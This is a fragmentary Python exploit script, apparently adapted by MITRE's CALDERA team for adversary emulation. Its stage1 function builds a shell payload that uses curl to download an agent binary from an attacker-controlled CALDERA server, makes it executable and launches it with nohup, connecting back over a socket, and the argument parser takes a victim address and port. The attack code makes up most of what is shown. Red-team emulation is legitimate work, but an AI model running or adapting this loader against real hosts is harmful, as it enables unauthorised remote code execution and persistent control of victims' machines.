...
def stage1(filename, randomuser, nonce, victimip, victimport, server):
    ...
    text = (f"""server="{server}";socket="{server}:5678";contact="tcp";agent=$(curl -svkOJ -X POST -H "file:manx.go" -H "platform:linux" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;nohup ./$agent -http $server -socket $socket -contact $contact &""")
    while i < len(text):
...
Modified by MITRE's CALDERA team
...
IP Addresses and DNS names are usable in the victim address field (if host supports DNS).
...
parser.add_argument("server", help="the attacker CALDERA IP or hostname address")
...
try:
    ...
    stage1(filename, randomuser, nonce, args.target, args.targetport, args.server)
